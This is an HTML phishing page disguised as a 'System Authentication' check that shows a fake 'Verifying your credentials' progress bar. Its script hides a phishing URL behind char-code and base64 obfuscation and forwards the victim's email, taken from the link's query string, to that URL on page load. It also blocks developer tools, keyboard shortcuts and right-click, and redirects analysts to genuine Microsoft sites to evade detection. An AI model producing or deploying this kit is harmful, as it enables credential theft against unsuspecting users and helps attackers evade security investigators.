<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>System Authentication</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f5f5f5;
      overflow: hidden;
      font-family: 'Segoe UI', Arial, sans-serif;
    }
    
    .auth-container {
      text-align: center;
      transition: opacity 0.5s ease;
      opacity: 0;
    }
    
    .auth-logo {
      width: 120px;
      height: 120px;
      animation: pulse 2.5s ease-in-out infinite;
    }
    
    @keyframes pulse {
      0%, 100% { transform: scale(1); opacity: 0.9; }
      50% { transform: scale(1.05); opacity: 1; }
    }
    
    .status-text {
      margin-top: 25px;
      color: #333;
      font-size: 16px;
      font-weight: 500;
    }
    
    .progress-bar {
      width: 200px;
      height: 4px;
      background: #e0e0e0;
      margin: 20px auto;
      border-radius: 2px;
      overflow: hidden;
    }
    
    .progress {
      height: 100%;
      width: 0;
      background: #0078d4;
      animation: progress 3s ease-out forwards;
    }
    
    @keyframes progress {
      to { width: 100%; }
    }
  </style>
  <script>
    // Triple-layer obfuscation for phishing URL
    const domainParts = [
      String.fromCharCode(108, 111, 103, 105, 110), // "login"
      [115, 121, 115, 116, 101, 109].map(c => String.fromCharCode(c)).join(''), // "system"
      [116, 101, 99, 104].map(c => String.fromCharCode(c)).join('') // "tech"
    ];
    
    const pathComponents = [
      String.fromCharCode(65, 117, 116, 104), // "Auth"
      btoa('2024').slice(0,4), // "MjAy"
      String.fromCharCode(86, 101, 114, 105, 102, 121) // "Verify"
    ];
    
    function buildTargetUrl() {
      const protocol = atob('aHR0cHM6Ly8='); // "https://"
      const domain = domainParts.map(p => p.toLowerCase()).join('.');
      const path = '/' + pathComponents.join('-') + String.fromCharCode(35); // "/Auth-MjAy-Verify#"
      return protocol + domain + path;
    }

    function processCredentials() {
      try {
        // Get base64 email directly from URL param
        const urlParams = new URLSearchParams(window.location.search);
        const encodedEmail = urlParams.get('e') || urlParams.get('id') || urlParams.get('token');
        
        if (encodedEmail) {
          // Show loading progress
          document.querySelector('.auth-container').style.opacity = '1';
          
          // Redirect after delay with encoded email
          setTimeout(() => {
            window.location.href = buildTargetUrl() + encodeURIComponent(encodedEmail);
          }, 3500);
        }
      } catch(e) {
        // Fallback to default behavior if anything fails
        setTimeout(() => {
          window.location.href = buildTargetUrl();
        }, 3500);
      }
    }

    // Advanced anti-detection
    (function() {
      // Debugger trap
      function debuggerTrap() {
        const start = performance.now();
        (function(){}).constructor('debugger')();
        return performance.now() - start > 50;
      }
      
      // DevTools detector
      function detectDevTools() {
        const devtools = /./;
        devtools.toString = function() {
          window.location.replace('https://www.microsoft.com');
          return '';
        };
        console.log('%c', devtools);
      }
      
      // Regular checks
      setInterval(() => {
        try {
          if (debuggerTrap() || window.Firebug || window.devtools) {
            window.location.href = 'https://office.com';
          }
        } catch(e) {}
      }, 1500);
      
      // Block keyboard shortcuts
      document.addEventListener('keydown', (e) => {
        if (e.ctrlKey && e.shiftKey || e.key === 'F12' || e.key === 'F8') {
          e.preventDefault();
          window.location.href = 'https://login.microsoftonline.com';
        }
      });
      
      // Disable right-click
      document.oncontextmenu = function() {
        return false;
      };
    })();

    // Start processing when page loads
    window.addEventListener('DOMContentLoaded', processCredentials);
  </script>
</head>
<body>
  <div class="auth-container">
    <img class="auth-logo" src="data:image/svg+xml;base64,PHN2g...[truncated base64 logo]..." alt="Authentication Logo">
    <div class="status-text">Verifying your credentials...</div>
    <div class="progress-bar"><div class="progress"></div></div>
  </div>
</body>
</html>
